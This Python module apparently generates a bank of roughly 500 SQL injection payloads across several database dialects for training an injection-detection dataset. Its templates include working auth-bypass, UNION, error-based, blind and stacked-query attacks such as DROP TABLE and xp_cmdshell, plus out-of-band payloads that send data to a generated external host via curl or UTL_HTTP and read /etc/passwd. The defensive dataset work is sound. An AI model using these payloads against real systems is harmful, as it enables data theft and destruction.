#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL injection seed bank for the v2 obfuscation dataset.

Why this file exists
--------------------
Dataset v1 had 34 SQLi seeds spread over 25.000 attack rows -- 847 rows per
seed. Every skeleton in the test split also appeared in train, so a model could
score 100% by memorising 34 strings. This bank builds ~500 *lexically distinct*
seeds so that "rows per seed" drops to a level where generalisation is actually
being measured.

Diversity comes from a matrix, not from a hand-typed list:

    technique x DBMS x breakout style x table x column x comment terminator

Two seeds are only "the same family" to the quality gate if they share the same
words after digits and hex ids are collapsed. Varying table/column/function
names -- not just numbers -- is what makes these count as separate families.

Every seed is a dict:

    {"payload": str, "category": str, "dbms": str}

`build_sqli_seeds()` is deterministic: same input, same list, same order.
"""
from __future__ import annotations

import random

# ---------------------------------------------------------------------------
# vocabulary axes
# ---------------------------------------------------------------------------
TABLES = [
    "users", "accounts", "members", "admin_users", "customers", "clients",
    "staff", "subscribers", "profiles", "credentials", "sessions", "tokens",
    "payments", "orders", "invoices", "employees", "tbl_user", "wp_users",
    "app_user", "auth_user", "user_login", "portal_members", "billing_info",
]

COLUMNS = [
    "username", "email", "password", "passwd", "pwd_hash", "token", "api_key",
    "secret", "ssn", "credit_card", "card_no", "salary", "role", "is_admin",
    "session_id", "first_name", "phone", "reset_token", "otp_code", "iban",
    "login_name", "user_pass", "auth_hash", "security_answer",
]

# breakout prefixes: how the payload escapes the surrounding literal
BREAKOUTS = [
    "'", "\"", "')", "\")", "'))", "1'", "-1'", "admin'", "0'",
    "1\"", "-1)", "')) OR ((", "1' ", "x'",
]

# Comment terminators, per dialect family.
#
# The empty string matters as much as the rest. In the first v2 pass every seed
# ended with a comment marker, which made "--" the single strongest feature a
# char n-gram model could find -- coefficient 9.88, higher than any payload
# token. Plenty of real injections are self-closing and need no terminator, so
# leaving it off part of the time is both more realistic and less leaky.
COMMENTS_MYSQL = ["-- -", "#", "-- ", "/*", ";-- -", "", "", "", "-- x", "%00",
                  ";%00", "-- 1", "#x"]
COMMENTS_ANSI = ["-- -", "-- ", "/*", ";--", "", "", "", "-- x", "%00", "-- 1"]

DBMS_LIST = ["mysql", "mssql", "postgres", "oracle", "sqlite"]

SCHEMA_VIEWS = {
    "mysql": ["information_schema.tables", "information_schema.columns",
              "information_schema.schemata", "mysql.user"],
    "mssql": ["sysobjects", "syscolumns", "sys.tables", "sys.columns",
              "master..sysdatabases"],
    "postgres": ["pg_tables", "pg_catalog.pg_user", "information_schema.columns",
                 "pg_shadow"],
    "oracle": ["all_tables", "all_tab_columns", "user_tables", "dba_users"],
    "sqlite": ["sqlite_master", "sqlite_temp_master"],
}

VERSION_FN = {
    "mysql": ["version()", "@@version", "@@hostname", "database()", "user()"],
    "mssql": ["@@version", "db_name()", "system_user", "@@servername"],
    "postgres": ["version()", "current_database()", "current_user", "inet_server_addr()"],
    "oracle": ["banner FROM v$version", "user FROM dual", "SYS_CONTEXT('USERENV','DB_NAME') FROM dual"],
    "sqlite": ["sqlite_version()"],
}

# per-DBMS row limiter, because LIMIT is not portable
def _limit_one(dbms: str, inner: str) -> str:
    if dbms == "mysql":
        return f"SELECT {inner} LIMIT 1"
    if dbms == "postgres":
        return f"SELECT {inner} LIMIT 1"
    if dbms == "sqlite":
        return f"SELECT {inner} LIMIT 1"
    if dbms == "mssql":
        return f"SELECT TOP 1 {inner}"
    return f"SELECT {inner} WHERE ROWNUM=1"  # oracle


# ---------------------------------------------------------------------------
# technique builders -- each yields payload strings
# ---------------------------------------------------------------------------
def _auth_bypass(rng: random.Random) -> list[dict]:
    """Tautologies. Diversity comes from breakout x predicate x comment."""
    predicates = [
        "OR '1'='1", "OR 1=1", "OR 'a'='a", "OR 2>1", "OR 'x' LIKE 'x'",
        "OR NOT 1=2", "OR 1 IN (1)", "OR 'ab' BETWEEN 'aa' AND 'az'",
        "OR EXISTS(SELECT 1)", "OR 3=3", "OR 'q'='q'", "OR 1 LIKE 1",
        "OR ASCII('A')=65", "OR LENGTH('abc')=3", "OR 'z' > 'a'",
        "OR NULL IS NULL", "OR 7=7-- ", "|| '1'='1", "OR 0=0",
        "OR CHAR(49)=CHAR(49)", "OR 'admin'='admin'", "OR TRUE",
    ]
    out = []
    for pred in predicates:
        for breakout in rng.sample(BREAKOUTS, k=4):
            comment = rng.choice(COMMENTS_MYSQL)
            out.append({
                "payload": f"{breakout} {pred}{comment}",
                "category": "auth_bypass",
                "dbms": "generic",
            })
    return out


def _union_based(rng: random.Random) -> list[dict]:
    """UNION SELECT with varying column counts, tables and padding style."""
    out = []
    for dbms in DBMS_LIST:
        for _ in range(22):
            ncols = rng.randint(1, 6)
            table = rng.choice(TABLES)
            cols = rng.sample(COLUMNS, k=min(ncols, len(COLUMNS)))
            # pad with NULL sometimes, so the shape varies
            if rng.random() < 0.35:
                pad = rng.randint(0, 3)
                cols = cols + ["NULL"] * pad
            select_list = ",".join(cols)
            breakout = rng.choice(BREAKOUTS)
            keyword = rng.choice(["UNION SELECT", "UNION ALL SELECT",
                                  "UNION DISTINCT SELECT"])
            tail = " FROM dual" if dbms == "oracle" and table == "dual" else f" FROM {table}"
            comment = rng.choice(COMMENTS_MYSQL if dbms == "mysql" else COMMENTS_ANSI)
            out.append({
                "payload": f"{breakout} {keyword} {select_list}{tail}{comment}",
                "category": "union_based",
                "dbms": dbms,
            })
        # schema enumeration variants
        for view in SCHEMA_VIEWS[dbms]:
            breakout = rng.choice(BREAKOUTS)
            comment = rng.choice(COMMENTS_ANSI)
            fields = rng.choice([
                "table_name", "table_name,column_name", "name", "tablename",
                "column_name", "schema_name",
            ])
            out.append({
                "payload": f"{breakout} UNION SELECT {fields} FROM {view}{comment}",
                "category": "union_based",
                "dbms": dbms,
            })
    return out


def _error_based(rng: random.Random) -> list[dict]:
    """Error-channel extraction. Function names differ sharply per DBMS."""
    out = []
    templates = {
        "mysql": [
            "AND extractvalue(1,concat(0x7e,({inner})))",
            "AND updatexml(1,concat(0x7e,({inner})),1)",
            "AND (SELECT 1 FROM(SELECT COUNT(*),concat(({inner}),floor(rand(0)*2))x "
            "FROM information_schema.tables GROUP BY x)a)",
            "AND exp(~(SELECT * FROM (SELECT ({inner}))a))",
            "AND GTID_SUBSET(({inner}),1)",
        ],
        "mssql": [
            "AND 1=CONVERT(int,({inner}))",
            "AND 1=CAST(({inner}) AS int)",
            "AND 1=(SELECT 1 FROM (SELECT ({inner}))t WHERE 1/0=0)",
        ],
        "postgres": [
            "AND 1=CAST(({inner}) AS int)",
            "AND 1=(SELECT CAST(({inner}) AS numeric))",
            "AND 1=(SELECT 1/(CASE WHEN ({inner})='' THEN 0 ELSE 1 END))",
        ],
        "oracle": [
            "AND 1=ctxsys.drithsx.sn(1,({inner}))",
            "AND 1=utl_inaddr.get_host_address(({inner}))",
            "AND 1=(SELECT XMLType('<a>'||({inner})||'</a>') FROM dual)",
            "AND 1=dbms_utility.sqlid_to_sqlhash(({inner}))",
        ],
        "sqlite": [
            "AND 1=(SELECT CAST(({inner}) AS int))",
            "AND 1=load_extension(({inner}))",
        ],
    }
    for dbms, tmpls in templates.items():
        for tmpl in tmpls:
            for _ in range(7):
                col = rng.choice(COLUMNS)
                table = rng.choice(TABLES)
                inner = rng.choice([
                    _limit_one(dbms, f"{col} FROM {table}"),
                    f"SELECT {rng.choice(VERSION_FN[dbms])}",
                    _limit_one(dbms, f"group_concat({col}) FROM {table}")
                    if dbms in ("mysql", "sqlite") else
                    _limit_one(dbms, f"{col} FROM {table}"),
                ])
                breakout = rng.choice(BREAKOUTS)
                comment = rng.choice(COMMENTS_ANSI)
                out.append({
                    "payload": f"{breakout} {tmpl.format(inner=inner)}{comment}",
                    "category": "error_based",
                    "dbms": dbms,
                })
    return out


def _boolean_blind(rng: random.Random) -> list[dict]:
    """Character-by-character inference with varied string functions."""
    out = []
    substr_fn = {
        "mysql": ["SUBSTRING", "MID", "SUBSTR"],
        "mssql": ["SUBSTRING"],
        "postgres": ["SUBSTRING", "SUBSTR"],
        "oracle": ["SUBSTR"],
        "sqlite": ["SUBSTR"],
    }
    ord_fn = {
        "mysql": ["ASCII", "ORD"],
        "mssql": ["ASCII", "UNICODE"],
        "postgres": ["ASCII"],
        "oracle": ["ASCII"],
        "sqlite": ["UNICODE"],
    }
    len_fn = {
        "mysql": ["LENGTH", "CHAR_LENGTH"],
        "mssql": ["LEN", "DATALENGTH"],
        "postgres": ["LENGTH", "CHAR_LENGTH"],
        "oracle": ["LENGTH"],
        "sqlite": ["LENGTH"],
    }
    for dbms in DBMS_LIST:
        for _ in range(20):
            col = rng.choice(COLUMNS)
            table = rng.choice(TABLES)
            pos = rng.randint(1, 12)
            code = rng.randint(48, 122)
            inner = _limit_one(dbms, f"{col} FROM {table}")
            shape = rng.choice(["ord_substr", "count", "length", "like", "in"])
            breakout = rng.choice(BREAKOUTS)
            comment = rng.choice(COMMENTS_ANSI)
            if shape == "ord_substr":
                body = (f"AND {rng.choice(ord_fn[dbms])}("
                        f"{rng.choice(substr_fn[dbms])}(({inner}),{pos},1))"
                        f"{rng.choice(['>', '<', '='])}{code}")
            elif shape == "count":
                body = f"AND (SELECT COUNT(*) FROM {table})>{rng.randint(0, 50)}"
            elif shape == "length":
                body = f"AND {rng.choice(len_fn[dbms])}(({inner}))={rng.randint(4, 40)}"
            elif shape == "like":
                letter = chr(rng.randint(97, 122))
                body = f"AND ({inner}) LIKE '{letter}%'"
            else:
                body = f"AND '{rng.choice(['admin', 'root', 'sa', 'postgres'])}' IN ({inner})"
            out.append({
                "payload": f"{breakout} {body}{comment}",
                "category": "boolean_blind",
                "dbms": dbms,
            })
    return out


def _time_blind(rng: random.Random) -> list[dict]:
    """Time-delay oracles. Sleep primitives are strongly DBMS-specific."""
    out = []
    delays = {
        "mysql": ["SLEEP({d})", "BENCHMARK(5000000,MD5({d}))",
                  "IF(1=1,SLEEP({d}),0)", "(SELECT 1 FROM (SELECT SLEEP({d}))a)",
                  "RLIKE SLEEP({d})", "AND SLEEP({d})"],
        "mssql": ["WAITFOR DELAY '0:0:{d}'", "WAITFOR TIME '0:0:{d}'",
                  "IF(1=1) WAITFOR DELAY '0:0:{d}'"],
        "postgres": ["pg_sleep({d})", "(SELECT pg_sleep({d}))",
                     "CASE WHEN (1=1) THEN pg_sleep({d}) ELSE 0 END"],
        "oracle": ["DBMS_PIPE.RECEIVE_MESSAGE('a',{d})",
                   "DBMS_LOCK.SLEEP({d})",
                   "(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)"],
        "sqlite": ["randomblob(100000000)",
                   "AND 1=LIKE('ABCDEFG',UPPER(HEX(randomblob(10000000))))"],
    }
    for dbms, fns in delays.items():
        for fn in fns:
            for _ in range(6):
                d = rng.choice([3, 5, 7, 10, 15])
                breakout = rng.choice(BREAKOUTS)
                joiner = rng.choice(["OR", "AND", ";", "OR NOT"])
                comment = rng.choice(COMMENTS_ANSI)
                body = fn.format(d=d)
                out.append({
                    "payload": f"{breakout} {joiner} {body}{comment}",
                    "category": "time_blind",
                    "dbms": dbms,
                })
    return out


def _stacked_queries(rng: random.Random) -> list[dict]:
    out = []
    actions = [
        "DROP TABLE {t}", "DELETE FROM {t}", "TRUNCATE TABLE {t}",
        "UPDATE {t} SET {c}='owned'", "INSERT INTO {t}({c}) VALUES('x')",
        "CREATE TABLE pwn_{n}(a int)", "ALTER TABLE {t} ADD backdoor varchar(10)",
        "GRANT ALL ON {t} TO PUBLIC", "UPDATE {t} SET is_admin=1 WHERE 1=1",
    ]
    mssql_extra = [
        "EXEC xp_cmdshell('whoami')", "EXEC master..xp_cmdshell('dir')",
        "EXEC sp_configure 'show advanced options',1",
        "EXEC xp_regread 'HKEY_LOCAL_MACHINE'",
    ]
    for action in actions:
        for _ in range(5):
            breakout = rng.choice(BREAKOUTS)
            comment = rng.choice(COMMENTS_ANSI)
            body = action.format(t=rng.choice(TABLES), c=rng.choice(COLUMNS),
                                 n=rng.randint(1, 999))
            out.append({
                "payload": f"{breakout}; {body}{comment}",
                "category": "stacked_queries",
                "dbms": rng.choice(["mysql", "postgres", "mssql"]),
            })
    for action in mssql_extra:
        for _ in range(3):
            breakout = rng.choice(BREAKOUTS)
            out.append({
                "payload": f"{breakout}; {action}{rng.choice(COMMENTS_ANSI)}",
                "category": "stacked_queries",
                "dbms": "mssql",
            })
    return out


def _out_of_band(rng: random.Random) -> list[dict]:
    out = []
    templates = {
        "mysql": ["AND LOAD_FILE(CONCAT('\\\\\\\\',({inner}),'.{host}\\\\a'))",
                  "AND (SELECT {c} FROM {t} LIMIT 1) INTO OUTFILE '/tmp/{f}'",
                  "AND LOAD_FILE('/etc/passwd')"],
        "mssql": ["AND 1=(SELECT 1 FROM master..xp_dirtree '\\\\\\\\{host}\\\\a')",
                  "; EXEC master..xp_fileexist '\\\\\\\\{host}\\\\a'"],
        "oracle": ["AND UTL_HTTP.request('http://{host}/'||({inner}))=1",
                   "AND UTL_INADDR.get_host_address('{host}')=1",
                   "AND DBMS_LDAP.init('{host}',80)=1"],
        "postgres": ["; COPY (SELECT {c} FROM {t}) TO PROGRAM 'curl http://{host}'",
                     "AND (SELECT dblink_connect('host={host}'))"],
    }
    for dbms, tmpls in templates.items():
        for tmpl in tmpls:
            for _ in range(4):
                host = f"{''.join(rng.choice('abcdef0123456789') for _ in range(6))}.oob-probe.net"
                inner = _limit_one(dbms, f"{rng.choice(COLUMNS)} FROM {rng.choice(TABLES)}")
                body = tmpl.format(host=host, inner=inner, c=rng.choice(COLUMNS),
                                   t=rng.choice(TABLES),
                                   f=f"o{rng.randint(100, 999)}.txt")
                out.append({
                    "payload": f"{rng.choice(BREAKOUTS)} {body}{rng.choice(COMMENTS_ANSI)}",
                    "category": "out_of_band",
                    "dbms": dbms,
                })
    return out


def _second_order(rng: random.Random) -> list[dict]:
    """Values that are harmless on write and dangerous when re-queried later."""
    out = []
    shapes = [
        "{name}'-- -",
        "{name}'||(SELECT {c} FROM {t} LIMIT 1)||'",
        "{name}' UNION SELECT {c} FROM {t}-- -",
        "{name}','x')-- -",
        "{name}'/**/OR/**/1=1-- -",
        "{name}'; UPDATE {t} SET {c}='pwn'-- -",
        "{name}' AND (SELECT COUNT(*) FROM {t})>0-- -",
    ]
    names = ["admin", "guest", "operator", "editor", "svc_backup", "auditor",
             "root", "webmaster", "moderator", "billing"]
    for shape in shapes:
        for name in names:
            out.append({
                "payload": shape.format(name=name, c=rng.choice(COLUMNS),
                                        t=rng.choice(TABLES)),
                "category": "second_order",
                "dbms": rng.choice(DBMS_LIST),
            })
    return out


# ---------------------------------------------------------------------------
def build_sqli_seeds(seed: int = 1337) -> list[dict]:
    """Deterministic seed bank. Duplicates by payload text are removed."""
    rng = random.Random(seed)
    seeds: list[dict] = []
    for builder in (_auth_bypass, _union_based, _error_based, _boolean_blind,
                    _time_blind, _stacked_queries, _out_of_band, _second_order):
        seeds.extend(builder(rng))

    unique: dict[str, dict] = {}
    for item in seeds:
        unique.setdefault(item["payload"], item)
    result = sorted(unique.values(), key=lambda d: (d["category"], d["dbms"], d["payload"]))
    for index, item in enumerate(result):
        item["seed_id"] = f"sqli_{item['category']}_{index:04d}"
    return result


if __name__ == "__main__":
    from collections import Counter

    bank = build_sqli_seeds()
    print(f"total SQLi seeds: {len(bank)}")
    print("by category:", dict(Counter(s["category"] for s in bank)))
    print("by dbms    :", dict(Counter(s["dbms"] for s in bank)))
    for sample in bank[:5]:
        print("  ", sample["payload"])
